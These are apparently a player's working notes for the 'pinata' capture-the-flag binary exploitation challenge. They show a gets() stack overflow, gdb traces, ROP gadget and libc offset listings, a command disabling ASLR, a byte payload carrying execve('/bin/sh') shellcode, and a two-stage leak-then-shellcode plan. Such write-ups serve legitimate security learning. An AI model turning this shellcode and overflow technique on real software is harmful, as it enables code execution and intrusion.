# pinata

## Solution

```sh

readelf -e pinata
```

```c
int reader(UI *ui,UI_STRING *uis)
{
  char *pcVar1;
  char local_18 [16];
  
  pcVar1 = gets(local_18);
  return (int)pcVar1;
}
```

gdb - `b *reader`

AAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC
RBP  0x7fffffffda70 ◂— 'BBBBBBBBCCCCCCCC'
RSP  0x7fffffffda60 ◂— 'AAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC'

`LEAVE`

*RBP  0x4242424242424242 ('BBBBBBBB')
*RSP  0x7fffffffda78 ◂— 'CCCCCCCC'
*RIP  0x401889 (reader+30) ◂— ret

`RET`

Reminder:
  - The `LEAVE` instruction copies the frame pointer (in the EBP register) into the stack pointer register (ESP)
  - `RET` Transfers program control to a return address located on the top of the stack.

so need to return back to libc? or is there a function somewhere?

```sh
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

note: `FUN_0045c00f` and `FUN_0047f1a9` seem strange...

/bin/sh
exit
system

https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc

strings -a -t x /lib/i386-linux-gnu/libc-2.27.so | grep "/bin/sh"

```sh
readelf -s ./glibc/libc.so.6 | grep system
# 1406: 000000000004f420    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5

readelf -s ./glibc/libc.so.6 | grep gets
# 89: 0000000000080060   432 FUNC    WEAK   DEFAULT   13 gets@@GLIBC_2.2.5

strings -a -t x ./glibc/libc.so.6 | grep /bin/sh
# 1b3d88 /bin/sh

ROPgadget --binary pinata | grep 'pop rdi'
# 0x0000000000401f6f : pop rdi ; ret

ROPgadget --binary pinata | grep "pop rbx ; ret"
# 0x00000000004019a0 : pop rbx ; ret

ROPgadget --binary pinata | grep "pop rax ; ret"
# 0x0000000000448017 : pop rax ; ret

ROPgadget --binary pinata | grep "int 0x80"
# 0x0000000000402fbf : int 0x80
```


https://www.exploit-db.com/exploits/42428

https://wiki.bi0s.in/pwning/rop/static/

python3 
b'AAAAAAAABBBBBBBBCCCCCCCC\xb0\xda\xff\xff\xff\x7f\x00\x00\x90\x90\x90\x90\x90\x90\x90\x90jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80\x90\x90\x90\x90\x00\x00\x00\x00\xef\xbe\xad\xde\x00\x00\x00\x00'


(echo "2"; python3 -c "import sys; sys.stdout.buffer.write(b'A'*56)") | ./pb

(python3 -c "import sys; sys.stdout.buffer.write(b'A')") | ./pinata

```sh
# https://blog.kuhi.to/rop-with-one-gadget/

objdump -T pinata
```

```sh
file pinata
# pinata: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=2dcf43face3a1fa76053b1589acf3b6e12d2eba4, for GNU/Linux 3.2.0, not stripped

checksec --file=pinata
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments
```

p /s $rip

https://www.youtube.com/watch?v=790lGRdyXaE


```txt
main 0x40188a
reader 0x40186b
...
0x401888 <reader+29>    leave
0x401889 <reader+30>    ret


$1 = {<text variable, no debug info>} 0x469d60 <fputs>
```

```sh
readelf -s pinata | grep 'puts'
# 2004: 0000000000469d60   294 FUNC    WEAK   HIDDEN     7 fputs

readelf -s pinata | grep 'write'
# 1325: 0000000000447650   157 FUNC    WEAK   HIDDEN     7 write

```

```c
// both 64-bit pointers
int reader(UI *ui,UI_STRING *uis) {
  char *pcVar1;
  char local_18 [16];
  
  pcVar1 = gets(local_18);
  return (int)pcVar1;
}
```

- reader() 1st pass: overflow buffer with call to puts($RIP) (leak stack address) and ret address of reader()
- reader() 2nd pass: overflow buffer with shellcode and ret address of calculated stack offset to shellcode


write 0x447650

```sh
ROPgadget --binary pinata | grep "jmp rbp"

# - The `LEAVE` instruction copies the frame pointer (in the EBP register) into the stack pointer register (ESP)
# - `RET` Transfers program control to a return address located on the top of the stack.

# 0x000000000046055d : jmp rbp
# 0x0000000000418c22 : push rsp ; ret
# 0x00000000004023ce : pop rsp ; ret
# 0x000000000047a3db : mov rbp, rsp ; mov rsi, rbp ; syscall
# 0x000000000047e1d1 : mov ebx, dword ptr [rsp] ; add rsp, 0x30 ; ret
# 0x000000000046cf2f : nop ; add rsp, 0x18 ; ret                 # 0x18 = 24
# 0x0000000000419898 : xor eax, eax ; add rsp, 8 ; ret
```

`x/64x $rsp`

## Alternate Solution

https://tig3rpuppet.blog/2023/10/28/hack-the-boo-2023-writeups/#pinata

using `environ` (https://github.com/Naetw/CTF-pwn-tips#leak-stack-address)
